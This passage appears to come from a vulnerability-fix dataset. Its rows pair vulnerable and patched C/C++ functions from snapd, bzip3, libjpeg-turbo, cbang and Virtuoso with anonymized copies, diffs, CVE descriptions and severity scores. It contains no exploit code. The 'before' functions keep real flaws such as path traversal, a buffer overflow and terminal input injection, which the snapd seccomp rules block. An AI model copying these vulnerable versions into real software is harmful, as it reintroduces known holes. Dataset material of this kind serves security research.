     * any of the 32bit architectures since there is no need for any extra
     * filtering there. */
    sc_err = seccomp_attr_set(ctx, SCMP_FLTATR_ACT_BADARCH, SCMP_ACT_ALLOW);
    if (sc_err < 0) {
        showerr(""cannot set action for unknown architectures"");
        return sc_err;
    }

    /* Resolve the name of ""ioctl"" on this architecture. We are not using the
     * system call number as available through the appropriate linux-specific
     * header. This allows us to use a system call number that is not defined
     * for the current architecture. This does not matter here, in this
     * specific program, however it is more generic. In addition this is more
     * in sync with the snap-seccomp program, which does the same for every
     * system call. */
    int sys_ioctl_nr;
    sys_ioctl_nr = seccomp_syscall_resolve_name(""ioctl"");
    if (sys_ioctl_nr == __NR_SCMP_ERROR) {
        showerr(""cannot resolve ioctl system call number"");
        return -ESRCH;
    }

    /* All of the rules must be added for the native architecture (using native
     * system call numbers). When the final program is generated the set of
     * architectures added earlier will be used to determine the correct system
     * call number for each architecture.
     *
     * In other words, arguments to scmp_rule_add() must always use native
     * system call numbers. Translation for the correct architecture will be
     * performed internally. This is not documented in libseccomp, but correct
     * operation was confirmed using the pseudo-code program and the bpf_dbg
     * tool from the kernel tools/bpf directory.
     *
     * NOTE: not using scmp_rule_add_exact as that was not doing anything
     * at all (presumably due to having all the architectures defined). */

    struct scmp_arg_cmp no_tty_inject = {
        /* We learned that existing programs make legitimate requests with all
         * bits set in the more significant 32bit word of the 64 bit double
         * word. While this kernel behavior remains suspect and presumably
         * undesired it is unlikely to change for backwards compatibility
         * reasons. As such we cannot block all requests with high-bits set.
         *
         * When faced with ioctl(fd, request); refuse to proceed when
         * request&0xffffffff == TIOCSTI. This specific way to encode the
         * filter has the following important properties:
         *
         * - it blocks ioctl(fd, TIOCSTI, ptr).
         * - it also blocks ioctl(fd, (1UL<<32) | TIOCSTI, ptr).
         * - it doesn't block ioctl(fd, (1UL<<32) | (request not equal to TIOCSTI), ptr); */
        .arg = 1,
        .op = SCMP_CMP_MASKED_EQ,
        .datum_a = 0xffffffffUL,
        .datum_b = TIOCSTI,
    };
    sc_err = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), sys_ioctl_nr, 1, no_tty_inject);

    /* also block use of TIOCLINUX */
    no_tty_inject.datum_b = TIOCLINUX;
    sc_err = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), sys_ioctl_nr, 1, no_tty_inject);

    if (sc_err < 0) {
        showerr(""cannot add rule preventing the use high bits in ioctl"");
        return sc_err;
    }
    return 0;
}","static int populate_filter(scmp_filter_ctx VAR_0, const uint32_t *VAR_1, size_t VAR_2) {
    int VAR_3;

    /* COMMENT_0 */
                                                                          
                 
      
                                                                                
                                                                                     
                                                                        
    uint32_t VAR_4 = seccomp_arch_native();
    bool VAR_5 = true;
    for (size_t VAR_6 = 0; VAR_6 < VAR_2; ++VAR_6) {
        if (VAR_1[VAR_6] == VAR_4) {
            VAR_5 = false;
            break;
        }
    }
    if (VAR_5) {
        VAR_3 = seccomp_arch_remove(VAR_0, VAR_7);
        if (VAR_3 < 0) {
            showerr(""cannot remove native architecture"");
            return VAR_3;
        }
    }

    /* COMMENT_7 */
      
                                                                               
                                                                          
                                                                              
                                            
    for (size_t VAR_6 = 0; VAR_6 < VAR_2; ++VAR_6) {
        uint32_t VAR_8 = VAR_1[VAR_6];
        VAR_3 = seccomp_arch_add(VAR_0, VAR_8);
        if (VAR_3 < 0 && VAR_3 != -VAR_9) {
            showerr(""cannot add architecture %x"", VAR_8);
            return VAR_3;
        }
    }

    /* COMMENT_13 */
                                                                            
                                                                          
                          
    VAR_3 = seccomp_attr_set(VAR_0, VAR_10, VAR_11);
    if (VAR_3 < 0) {
        showerr(""cannot set action for unknown architectures"");
        return VAR_3;
    }

    /* COMMENT_17 */
                                                                             
                                                                             
                                                                       
                                                                             
                                                                           
                      
    int VAR_12;
    VAR_12 = seccomp_syscall_resolve_name(""ioctl"");
    if (VAR_12 == VAR_13) {
        showerr(""cannot resolve ioctl system call number"");
        return -VAR_14;
    }

    /* COMMENT_24 */
                                                                           
                                                                               
                                         
      
                                                                          
                                                                            
                                                                              
                                                                            
                                                
      
                                                                         
                                                                          

    struct scmp_arg_cmp VAR_15 = {
        /* COMMENT_36 */
                                                                           
                                                                          
                                                                         
                                                                            
          
                                                                     
                                                                         
                                                         
          
                                               
                                                                
                                                                                            
        .arg = 1,
        .op = VAR_16,
        .datum_a = 0xffffffffUL,
        .datum_b = VAR_17,
    };
    VAR_3 = seccomp_rule_add(VAR_0, SCMP_ACT_ERRNO(VAR_18), VAR_12, 1, VAR_15);

    /* COMMENT_48 */
    VAR_15.datum_b = VAR_19;
    VAR_3 = seccomp_rule_add(VAR_0, SCMP_ACT_ERRNO(VAR_18), VAR_12, 1, VAR_15);

    if (VAR_3 < 0) {
        showerr(""cannot add rule preventing the use high bits in ioctl"");
        return VAR_3;
    }
    return 0;
}",snapcore/snapd/997dbfd5327d6e429f63ae7adc2bf2b31f070931/snap-seccomp-blacklist.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -77,7 +77,7 @@
      * NOTE: not using scmp_rule_add_exact as that was not doing anything
      * at all (presumably due to having all the architectures defined). */
 
-    const struct scmp_arg_cmp no_tty_inject = {
+    struct scmp_arg_cmp no_tty_inject = {
         /* We learned that existing programs make legitimate requests with all
          * bits set in the more significant 32bit word of the 64 bit double
          * word. While this kernel behavior remains suspect and presumably
@@ -98,6 +98,10 @@
     };
     sc_err = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), sys_ioctl_nr, 1, no_tty_inject);
 
+    /* also block use of TIOCLINUX */
+    no_tty_inject.datum_b = TIOCLINUX;
+    sc_err = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), sys_ioctl_nr, 1, no_tty_inject);
+
     if (sc_err < 0) {
         showerr(""cannot add rule preventing the use high bits in ioctl"");
         return sc_err;","{'deleted_lines': ['    const struct scmp_arg_cmp no_tty_inject = {'], 'added_lines': ['    struct scmp_arg_cmp no_tty_inject = {', '    /* also block use of TIOCLINUX */', '    no_tty_inject.datum_b = TIOCLINUX;', '    sc_err = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), sys_ioctl_nr, 1, no_tty_inject);', '']}",True,"Using the TIOCLINUX ioctl request, a malicious snap could inject contents into the input of the controlling terminal which could allow it to cause arbitrary commands to be executed outside of the snap sandbox after the snap exits. Graphical terminal emulators like xterm, gnome-terminal and others are not affected - this can only be exploited when snaps are run on a virtual console.",10.0,CRITICAL,3,valid,2023-03-22T04:53:49Z,4
CVE-2023-29415,['CWE-Other'],CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,kspalaiologos/bzip3,xwrite: nop when len=0 / size=0,56c24ca1f8f25e648d42154369b6962600f76465,https://github.com/kspalaiologos/bzip3/commit/56c24ca1f8f25e648d42154369b6962600f76465,src/main.c,xwrite,"static void xwrite(const void * data, size_t size, size_t len, FILE * des) {
if (fwrite(data, size, len, des) != len) {
fprintf(stderr, ""Write error: %s\n"", strerror(errno));
exit(1);
}
}","static void xwrite(const void * VAR_0, size_t VAR_1, size_t VAR_2, FILE * VAR_3) {
if (fwrite(VAR_0, VAR_1, VAR_2, VAR_3) != VAR_2) {
fprintf(VAR_4, ""Write error: %s\n"", strerror(VAR_5));
exit(1);
}
}",kspalaiologos/bzip3/56c24ca1f8f25e648d42154369b6962600f76465/main.c/vul/before/0.json,"static void xwrite(const void * data, size_t size, size_t len, FILE * des) {
    if (len == 0 || size == 0)
        return;
    if (fwrite(data, size, len, des) != len) {
        fprintf(stderr, ""Write error: %s\n"", strerror(errno));
        exit(1);
    }
}","static void xwrite(const void * VAR_0, size_t VAR_1, size_t VAR_2, FILE * VAR_3) {
    if (VAR_2 == 0 || VAR_1 == 0)
        return;
    if (fwrite(VAR_0, VAR_1, VAR_2, VAR_3) != VAR_2) {
        fprintf(VAR_4, ""Write error: %s\n"", strerror(VAR_5));
        exit(1);
    }
}",kspalaiologos/bzip3/56c24ca1f8f25e648d42154369b6962600f76465/main.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,4 +1,6 @@
 static void xwrite(const void * data, size_t size, size_t len, FILE * des) {
+    if (len == 0 || size == 0)
+        return;
     if (fwrite(data, size, len, des) != len) {
         fprintf(stderr, ""Write error: %s\n"", strerror(errno));
         exit(1);","{'deleted_lines': [], 'added_lines': ['    if (len == 0 || size == 0)', '        return;']}",True,An issue was discovered in libbzip3.a in bzip3 before 1.3.0. A denial of service (process hang) can occur with a crafted archive because bzip3 does not follow the required procedure for interacting with libsais.,6.5,MEDIUM,1,valid,2023-03-27T11:46:27Z,4
CVE-2023-2804,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,libjpeg-turbo,"Lossless decomp: Range-limit 12-bit samples

12-bit is the only data precision for which the range of the sample data
type exceeds the valid sample range, so it is possible to craft a 12-bit
lossless JPEG image that contains out-of-range 12-bit samples.
Attempting to decompress such an image using color quantization or merged
upsampling (NOTE: libjpeg-turbo cannot generate YCbCr or subsampled
lossless JPEG images, but it can decompress them) caused segfaults or
buffer overruns when those algorithms attempted to use the out-of-range
sample values as array indices.  This commit modifies the lossless
decompressor so that it range-limits the output of the scaler when using
12-bit samples.

Fixes #670
Fixes #672
Fixes #673
Fixes #674
Fixes #675
Fixes #676
Fixes #677
Fixes #678
Fixes #679
Fixes #681
Fixes #683",9f756bc67a84d4566bf74a0c2432aa55da404021,https://github.com/libjpeg-turbo/libjpeg-turbo/commit/9f756bc67a84d4566bf74a0c2432aa55da404021,jdlossls.c,simple_upscale,"METHODDEF(void)
simple_upscale(j_decompress_ptr cinfo,
JDIFFROW diff_buf, _JSAMPROW output_buf, JDIMENSION width)
{
do {
*output_buf++ = (_JSAMPLE)(*diff_buf++ << cinfo->Al);
} while (--width);
}","VAR_0(void)
simple_upscale(j_decompress_ptr VAR_1,
JDIFFROW VAR_2, _JSAMPROW VAR_3, JDIMENSION VAR_4)
{
do {
*VAR_3++ = (VAR_5)(*VAR_2++ << VAR_1->Al);
} while (--VAR_4);
}",,"METHODDEF(void)
simple_upscale(j_decompress_ptr cinfo,
               JDIFFROW diff_buf, _JSAMPROW output_buf, JDIMENSION width)
{
  do {
#if BITS_IN_JSAMPLE == 12
    /* 12-bit is the only data precision for which the range of the sample data
     * type exceeds the valid sample range.  Thus, we need to range-limit the
     * samples, because other algorithms may try to use them as array indices.
     */
    *output_buf++ = (_JSAMPLE)((*diff_buf++ << cinfo->Al) & 0xFFF);
#else
    *output_buf++ = (_JSAMPLE)(*diff_buf++ << cinfo->Al);
#endif
  } while (--width);
}","VAR_0(void)
simple_upscale(j_decompress_ptr VAR_1,
               JDIFFROW VAR_2, _JSAMPROW VAR_3, JDIMENSION VAR_4)
{
  do {
#if VAR_5 == 12
    /* COMMENT_0 */
                                                                             
                                                                              
       
    *VAR_3++ = (VAR_6)((*VAR_2++ << VAR_1->Al) & 0xFFF);
#else
    *VAR_3++ = (VAR_6)(*VAR_2++ << VAR_1->Al);
#endif
  } while (--VAR_4);
}",,"--- func_before
+++ func_after
@@ -3,6 +3,14 @@
                JDIFFROW diff_buf, _JSAMPROW output_buf, JDIMENSION width)
 {
   do {
+#if BITS_IN_JSAMPLE == 12
+    /* 12-bit is the only data precision for which the range of the sample data
+     * type exceeds the valid sample range.  Thus, we need to range-limit the
+     * samples, because other algorithms may try to use them as array indices.
+     */
+    *output_buf++ = (_JSAMPLE)((*diff_buf++ << cinfo->Al) & 0xFFF);
+#else
     *output_buf++ = (_JSAMPLE)(*diff_buf++ << cinfo->Al);
+#endif
   } while (--width);
 }","{'deleted_lines': [], 'added_lines': ['#if BITS_IN_JSAMPLE == 12', '    /* 12-bit is the only data precision for which the range of the sample data', '     * type exceeds the valid sample range.  Thus, we need to range-limit the', '     * samples, because other algorithms may try to use them as array indices.', '     */', '    *output_buf++ = (_JSAMPLE)((*diff_buf++ << cinfo->Al) & 0xFFF);', '#else', '#endif']}",True,"A heap-based buffer overflow issue was discovered in libjpeg-turbo in h2v2_merged_upsample_internal() function of jdmrgext.c file. The vulnerability can only be exploited with 12-bit data precision for which the range of the sample data type exceeds the valid sample range, hence, an attacker could craft a 12-bit lossless JPEG image that contains out-of-range 12-bit samples. An application attempting to decompress such image using merged upsampling would lead to segmentation fault or buffer overflows, causing an application to crash.",6.5,MEDIUM,1,valid,2023-04-04T18:53:21Z,4
CVE-2023-2804,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,libjpeg-turbo,"Lossless decomp: Range-limit 12-bit samples

12-bit is the only data precision for which the range of the sample data
type exceeds the valid sample range, so it is possible to craft a 12-bit
lossless JPEG image that contains out-of-range 12-bit samples.
Attempting to decompress such an image using color quantization or merged
upsampling (NOTE: libjpeg-turbo cannot generate YCbCr or subsampled
lossless JPEG images, but it can decompress them) caused segfaults or
buffer overruns when those algorithms attempted to use the out-of-range
sample values as array indices.  This commit modifies the lossless
decompressor so that it range-limits the output of the scaler when using
12-bit samples.

Fixes #670
Fixes #672
Fixes #673
Fixes #674
Fixes #675
Fixes #676
Fixes #677
Fixes #678
Fixes #679
Fixes #681
Fixes #683",9f756bc67a84d4566bf74a0c2432aa55da404021,https://github.com/libjpeg-turbo/libjpeg-turbo/commit/9f756bc67a84d4566bf74a0c2432aa55da404021,jdlossls.c,noscale,"METHODDEF(void)
noscale(j_decompress_ptr cinfo,
JDIFFROW diff_buf, _JSAMPROW output_buf, JDIMENSION width)
{
do {
*output_buf++ = (_JSAMPLE)(*diff_buf++);
} while (--width);
}","VAR_0(void)
noscale(j_decompress_ptr VAR_1,
JDIFFROW VAR_2, _JSAMPROW VAR_3, JDIMENSION VAR_4)
{
do {
*VAR_3++ = (VAR_5)(*VAR_2++);
} while (--VAR_4);
}",,"METHODDEF(void)
noscale(j_decompress_ptr cinfo,
        JDIFFROW diff_buf, _JSAMPROW output_buf, JDIMENSION width)
{
  do {
#if BITS_IN_JSAMPLE == 12
    *output_buf++ = (_JSAMPLE)((*diff_buf++) & 0xFFF);
#else
    *output_buf++ = (_JSAMPLE)(*diff_buf++);
#endif
  } while (--width);
}","VAR_0(void)
noscale(j_decompress_ptr VAR_1,
        JDIFFROW VAR_2, _JSAMPROW VAR_3, JDIMENSION VAR_4)
{
  do {
#if VAR_5 == 12
    *VAR_3++ = (VAR_6)((*VAR_2++) & 0xFFF);
#else
    *VAR_3++ = (VAR_6)(*VAR_2++);
#endif
  } while (--VAR_4);
}",,"--- func_before
+++ func_after
@@ -3,6 +3,10 @@
         JDIFFROW diff_buf, _JSAMPROW output_buf, JDIMENSION width)
 {
   do {
+#if BITS_IN_JSAMPLE == 12
+    *output_buf++ = (_JSAMPLE)((*diff_buf++) & 0xFFF);
+#else
     *output_buf++ = (_JSAMPLE)(*diff_buf++);
+#endif
   } while (--width);
 }","{'deleted_lines': [], 'added_lines': ['#if BITS_IN_JSAMPLE == 12', '    *output_buf++ = (_JSAMPLE)((*diff_buf++) & 0xFFF);', '#else', '#endif']}",True,"A heap-based buffer overflow issue was discovered in libjpeg-turbo in h2v2_merged_upsample_internal() function of jdmrgext.c file. The vulnerability can only be exploited with 12-bit data precision for which the range of the sample data type exceeds the valid sample range, hence, an attacker could craft a 12-bit lossless JPEG image that contains out-of-range 12-bit samples. An application attempting to decompress such image using merged upsampling would lead to segmentation fault or buffer overflows, causing an application to crash.",6.5,MEDIUM,1,valid,2023-04-04T18:53:21Z,4
CVE-2023-31483,['CWE-22'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N,1,CauldronDevelopmentLLC/cbang,Path traversal bug in TarFileReader::extract() #115,ac8bbdd5bb93c01679a881f5962fed800bf29e58,https://github.com/CauldronDevelopmentLLC/cbang/commit/ac8bbdd5bb93c01679a881f5962fed800bf29e58,src/cbang/tar/TarFileReader.cpp,TarFileReader::extract,"std::string TarFileReader::extract(const string &_path) {
if (_path.empty()) THROW(""path cannot be empty"");
if (!hasMore()) THROW(""No more tar files"");
string path = _path;
if (SystemUtilities::isDirectory(path)) {
path += ""/"" + getFilename();
string a = SystemUtilities::getCanonicalPath(_path);
string b = SystemUtilities::getCanonicalPath(path);
if (!String::startsWith(b, a))
THROW(""Tar path points outside of the extraction directory: "" << path);
}
LOG_DEBUG(5, ""Extracting: "" << path);
switch (getType()) {
case REG_FILE: case NORMAL_FILE: case CONTIGUOUS_FILE:
return extract(*SystemUtilities::oopen(path, getMode()));
case DIRECTORY:
SystemUtilities::ensureDirectory(path);
didReadHeader = false;
break;
default: THROW(""Unsupported tar file type "" << getType());
}
return getFilename();
}","std::string TarFileReader::extract(const string &VAR_0) {
if (VAR_0.empty()) THROW(""path cannot be empty"");
if (!hasMore()) THROW(""No more tar files"");
string VAR_1 = VAR_0;
if (SystemUtilities::isDirectory(VAR_1)) {
VAR_1 += ""/"" + getFilename();
string VAR_2 = SystemUtilities::getCanonicalPath(VAR_0);
string VAR_3 = SystemUtilities::getCanonicalPath(VAR_1);
if (!String::startsWith(VAR_3, VAR_2))
THROW(""Tar path points outside of the extraction directory: "" << VAR_1);
}
LOG_DEBUG(5, ""Extracting: "" << VAR_1);
switch (getType()) {
case VAR_4: case VAR_5: case VAR_6:
return extract(*SystemUtilities::oopen(VAR_1, getMode()));
case VAR_7:
SystemUtilities::ensureDirectory(VAR_1);
VAR_8 = false;
break;
default: THROW(""Unsupported tar file type "" << getType());
}
return getFilename();
}",CauldronDevelopmentLLC/cbang/ac8bbdd5bb93c01679a881f5962fed800bf29e58/TarFileReader.cpp/vul/before/0.json,"std::string TarFileReader::extract(const string &_path) {
  if (_path.empty()) THROW(""path cannot be empty"");
  if (!hasMore()) THROW(""No more tar files"");

  string path = _path;
  if (SystemUtilities::isDirectory(path)) {
    path += ""/"" + getFilename();

    // Check that path is under the target directory
    string a = SystemUtilities::getCanonicalPath(_path);
    string b = SystemUtilities::getCanonicalPath(path);
    if (!String::startsWith(b, a + ""/""))
      THROW(""Tar path points outside of the extraction directory: "" << path);
  }

  LOG_DEBUG(5, ""Extracting: "" << path);

  switch (getType()) {
  case REG_FILE: case NORMAL_FILE: case CONTIGUOUS_FILE:
    return extract(*SystemUtilities::oopen(path, getMode()));

  case DIRECTORY:
    SystemUtilities::ensureDirectory(path);
    didReadHeader = false;
    break;

  default: THROW(""Unsupported tar file type "" << getType());
  }

  return getFilename();
}","std::string TarFileReader::extract(const string &VAR_0) {
  if (VAR_0.empty()) THROW(""path cannot be empty"");
  if (!hasMore()) THROW(""No more tar files"");

  string VAR_1 = VAR_0;
  if (SystemUtilities::isDirectory(VAR_1)) {
    VAR_1 += ""/"" + getFilename();

    /* COMMENT_0 */
    string VAR_2 = SystemUtilities::getCanonicalPath(VAR_0);
    string VAR_3 = SystemUtilities::getCanonicalPath(VAR_1);
    if (!String::startsWith(VAR_3, VAR_2 + ""/""))
      THROW(""Tar path points outside of the extraction directory: "" << VAR_1);
  }

  LOG_DEBUG(5, ""Extracting: "" << VAR_1);

  switch (getType()) {
  case VAR_4: case VAR_5: case VAR_6:
    return extract(*SystemUtilities::oopen(VAR_1, getMode()));

  case VAR_7:
    SystemUtilities::ensureDirectory(VAR_1);
    VAR_8 = false;
    break;

  default: THROW(""Unsupported tar file type "" << getType());
  }

  return getFilename();
}",CauldronDevelopmentLLC/cbang/ac8bbdd5bb93c01679a881f5962fed800bf29e58/TarFileReader.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -9,7 +9,7 @@
     // Check that path is under the target directory
     string a = SystemUtilities::getCanonicalPath(_path);
     string b = SystemUtilities::getCanonicalPath(path);
-    if (!String::startsWith(b, a))
+    if (!String::startsWith(b, a + ""/""))
       THROW(""Tar path points outside of the extraction directory: "" << path);
   }
 ","{'deleted_lines': ['    if (!String::startsWith(b, a))'], 'added_lines': ['    if (!String::startsWith(b, a + ""/""))']}",True,tar/TarFileReader.cpp in Cauldron cbang before bastet-v8.1.17 has a directory traversal during extraction that allows the attacker to create or write to files outside the current directory via a crafted tar archive.,7.5,HIGH,2,valid,2023-04-11T09:50:07Z,4
CVE-2023-31607,['CWE-89'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,openlink/virtuoso-opensource,Fixed missing check for max number of key parts (fixes #1120),ea8b2c975c6c96f36e34014d6c71a73761198ebe,https://github.com/openlink/virtuoso-opensource/commit/ea8b2c975c6c96f36e34014d6c71a73761198ebe,libsrc/Wi/ddlrun.c,ddl_create_key,"void
ddl_create_key (query_instance_t * qi,
char *name, char *table, caddr_t * parts,
int cluster_on_id, int is_object_id, int is_unique, int is_bitmap, caddr_t * opts)
{
caddr_t tn, in;
client_connection_t *cli = qi->qi_client;
caddr_t parts_tmp[K_MAX_PARTS];
caddr_t parts_box;
key_id_t key_id;
int n_parts = BOX_ELEMENTS (parts);
int decl_parts = n_parts;
int parts_fill = n_parts, x;
local_cursor_t *lc_keys;
local_cursor_t *lc_key_parts;
int n_primary, prim_id;
char *szTheTableName;
dk_set_t to_free = NULL;
memcpy (parts_tmp, parts, box_length ((caddr_t) parts));
qr_rec_exec (find_primary_stmt, cli, &lc_keys, qi, NULL, 1,
"":0"", table, QRP_STR);
if (!lc_next (lc_keys))
{
lc_free (lc_keys);
sqlr_new_error (""42S12"", ""SQ017"",
""No primary key for %s. Specify qualifier and owner if you are not owner of the table."", table);
}
n_primary = (int) unbox (lc_get_col (lc_keys, ""K.KEY_N_SIGNIFICANT""));
prim_id = (int) unbox (lc_get_col (lc_keys, ""K.KEY_ID""));
szTheTableName  = box_string((case_mode == CM_MSSQL) ? lc_get_col (lc_keys, ""K.KEY_TABLE"") : table);
lc_free (lc_keys);
ddl_check_duplicate_cols (NULL, parts);
qr_rec_exec (get_key_parts_stmt, cli, &lc_key_parts, qi, NULL, 2,
"":ID"", (ptrlong) prim_id, QRP_INT,
"":LIMIT"", (ptrlong) n_primary, QRP_INT);
while (lc_next (lc_key_parts))
{
char *c_name = box_string (lc_get_col (lc_key_parts, ""C.COLUMN""));
if (KO_NO_PK (opts))
goto already_in;
for (x = 0; x < n_parts; x++)
if (0 == CASEMODESTRCMP (c_name, parts[x]))
{
dk_free_box (c_name);
goto already_in;
}
dk_set_push (&to_free, c_name);
parts_tmp[parts_fill++] = c_name;
already_in:;
}
lc_free (lc_key_parts);
parts_box = dk_alloc_box (parts_fill * sizeof (caddr_t),
DV_ARRAY_OF_POINTER);
memcpy (parts_box, parts_tmp, parts_fill * sizeof (caddr_t));
ddl_insert_sec_key_parts (qi, (key_id_t) prim_id, szTheTableName, name, (caddr_t *) parts_box,
cluster_on_id, &key_id, is_object_id, is_unique, decl_parts);
dk_free_tree (list_to_array (to_free));
dk_free_box (parts_box);
ddl_key_options (qi, szTheTableName, key_id, opts);
if (is_unique)
ddl_key_opt (qi, szTheTableName, key_id);
ddl_table_changed (qi, szTheTableName);
tn = box_dv_short_string (table);
in = box_dv_short_string (name);
inx_opt_cluster (qi, tn, in, opts);
dk_free_box (tn);
dk_free_box (in);
{
dbe_table_t *tb = qi_name_to_table (qi, szTheTableName);
if (tb)
ddl_create_subtable_keys (qi, tb, name, key_id, key_id);
}
dk_free_box(szTheTableName);
}","void
ddl_create_key (query_instance_t * VAR_0,
char *VAR_1, char *VAR_2, caddr_t * VAR_3,
int VAR_4, int VAR_5, int VAR_6, int VAR_7, caddr_t * VAR_8)
{
caddr_t VAR_9, VAR_10;
client_connection_t *VAR_11 = VAR_0->qi_client;
caddr_t VAR_12[VAR_13];
caddr_t VAR_14;
key_id_t VAR_15;
int VAR_16 = BOX_ELEMENTS (VAR_3);
int VAR_17 = VAR_16;
int VAR_18 = VAR_16, VAR_19;
local_cursor_t *VAR_20;
local_cursor_t *VAR_21;
int VAR_22, VAR_23;
char *VAR_24;
dk_set_t VAR_25 = NULL;
memcpy (VAR_12, VAR_3, box_length ((caddr_t) VAR_3));
qr_rec_exec (VAR_26, VAR_11, &VAR_20, VAR_0, NULL, 1,
"":0"", VAR_2, VAR_27);
if (!lc_next (VAR_20))
{
lc_free (VAR_20);
sqlr_new_error (""42S12"", ""SQ017"",
""No primary key for %s. Specify qualifier and owner if you are not owner of the table."", VAR_2);
}
VAR_22 = (int) unbox (lc_get_col (VAR_20, ""K.KEY_N_SIGNIFICANT""));
VAR_23 = (int) unbox (lc_get_col (VAR_20, ""K.KEY_ID""));
VAR_24  = box_string((VAR_28 == VAR_29) ? lc_get_col (VAR_20, ""K.KEY_TABLE"") : VAR_2);
lc_free (VAR_20);
ddl_check_duplicate_cols (NULL, VAR_3);
qr_rec_exec (VAR_30, VAR_11, &VAR_21, VAR_0, NULL, 2,
"":ID"", (ptrlong) VAR_23, VAR_31,
"":LIMIT"", (ptrlong) VAR_22, VAR_31);
while (lc_next (VAR_21))
{
char *VAR_32 = box_string (lc_get_col (VAR_21, ""C.COLUMN""));
if (KO_NO_PK (VAR_8))
goto already_in;
for (VAR_19 = 0; VAR_19 < VAR_16; VAR_19++)
if (0 == CASEMODESTRCMP (VAR_32, VAR_3[VAR_19]))
{
dk_free_box (VAR_32);
goto already_in;
}
dk_set_push (&VAR_25, VAR_32);
VAR_12[VAR_18++] = VAR_32;
already_in:;
}
lc_free (VAR_21);
VAR_14 = dk_alloc_box (VAR_18 * sizeof (caddr_t),
VAR_33);
memcpy (VAR_14, VAR_12, VAR_18 * sizeof (caddr_t));
ddl_insert_sec_key_parts (VAR_0, (key_id_t) VAR_23, VAR_24, VAR_1, (caddr_t *) VAR_14,
VAR_4, &VAR_15, VAR_5, VAR_6, VAR_17);
dk_free_tree (list_to_array (VAR_25));
dk_free_box (VAR_14);
ddl_key_options (VAR_0, VAR_24, VAR_15, VAR_8);
if (VAR_6)
ddl_key_opt (VAR_0, VAR_24, VAR_15);
ddl_table_changed (VAR_0, VAR_24);
VAR_9 = box_dv_short_string (VAR_2);
VAR_10 = box_dv_short_string (VAR_1);
inx_opt_cluster (VAR_0, VAR_9, VAR_10, VAR_8);
dk_free_box (VAR_9);
dk_free_box (VAR_10);
{
dbe_table_t *VAR_34 = qi_name_to_table (VAR_0, VAR_24);
if (VAR_34)
ddl_create_subtable_keys (VAR_0, VAR_34, VAR_1, VAR_15, VAR_15);
}
dk_free_box(VAR_24);
}",openlink/virtuoso-opensource/ea8b2c975c6c96f36e34014d6c71a73761198ebe/ddlrun.c/vul/before/0.json,"void
ddl_create_key (query_instance_t * qi,
    char *name, char *table, caddr_t * parts,
		int cluster_on_id, int is_object_id, int is_unique, int is_bitmap, caddr_t * opts)
{
  caddr_t tn, in;
  client_connection_t *cli = qi->qi_client;
  caddr_t parts_tmp[K_MAX_PARTS];

  caddr_t parts_box;
  key_id_t key_id;
  int n_parts = BOX_ELEMENTS (parts);
  int decl_parts = n_parts;
  int parts_fill = n_parts, x;
  local_cursor_t *lc_keys;
  local_cursor_t *lc_key_parts;
  int n_primary, prim_id;
  char *szTheTableName;
  dk_set_t to_free = NULL;

  if (n_parts > K_MAX_PARTS)
    sqlr_new_error (""42S12"", ""SQ017"", ""Too many key parts"");
  memcpy (parts_tmp, parts, box_length ((caddr_t) parts));

  qr_rec_exec (find_primary_stmt, cli, &lc_keys, qi, NULL, 1,
      "":0"", table, QRP_STR);
  if (!lc_next (lc_keys))
    {
      lc_free (lc_keys);
      sqlr_new_error (""42S12"", ""SQ017"",
	  ""No primary key for %s. Specify qualifier and owner if you are not owner of the table."", table);
    }
  n_primary = (int) unbox (lc_get_col (lc_keys, ""K.KEY_N_SIGNIFICANT""));
  prim_id = (int) unbox (lc_get_col (lc_keys, ""K.KEY_ID""));
  szTheTableName  = box_string((case_mode == CM_MSSQL) ? lc_get_col (lc_keys, ""K.KEY_TABLE"") : table);
  lc_free (lc_keys);

  ddl_check_duplicate_cols (NULL, parts);

  qr_rec_exec (get_key_parts_stmt, cli, &lc_key_parts, qi, NULL, 2,
      "":ID"", (ptrlong) prim_id, QRP_INT,
      "":LIMIT"", (ptrlong) n_primary, QRP_INT);
  while (lc_next (lc_key_parts))
    {
      /* oid_t col_id = unbox (lc_get_col (lc_key_parts, ""K.KP_COL"")); */
      /* int nth = (int) unbox (lc_get_col (lc_key_parts, ""K.KP_NTH"")); */
      char *c_name = box_string (lc_get_col (lc_key_parts, ""C.COLUMN""));
      if (KO_NO_PK (opts))
	goto already_in;
      for (x = 0; x < n_parts; x++)
	if (0 == CASEMODESTRCMP (c_name, parts[x]))
	  {
	    dk_free_box (c_name);
	    goto already_in;
	  }

      dk_set_push (&to_free, c_name);
      parts_tmp[parts_fill++] = c_name;
    already_in:;
    }
  lc_free (lc_key_parts);

  parts_box = dk_alloc_box (parts_fill * sizeof (caddr_t),
      DV_ARRAY_OF_POINTER);
  memcpy (parts_box, parts_tmp, parts_fill * sizeof (caddr_t));


  ddl_insert_sec_key_parts (qi, (key_id_t) prim_id, szTheTableName, name, (caddr_t *) parts_box,
      cluster_on_id, &key_id, is_object_id, is_unique, decl_parts);

  dk_free_tree (list_to_array (to_free));
  dk_free_box (parts_box);

  ddl_key_options (qi, szTheTableName, key_id, opts);
  if (is_unique)
    ddl_key_opt (qi, szTheTableName, key_id);
  ddl_table_changed (qi, szTheTableName);
  tn = box_dv_short_string (table);
  in = box_dv_short_string (name);
  inx_opt_cluster (qi, tn, in, opts);
  dk_free_box (tn);
  dk_free_box (in);

  {
    dbe_table_t *tb = qi_name_to_table (qi, szTheTableName);
    if (tb)
      ddl_create_subtable_keys (qi, tb, name, key_id, key_id);
  }
  dk_free_box(szTheTableName);
}","void
ddl_create_key (query_instance_t * VAR_0,
    char *VAR_1, char *VAR_2, caddr_t * VAR_3,
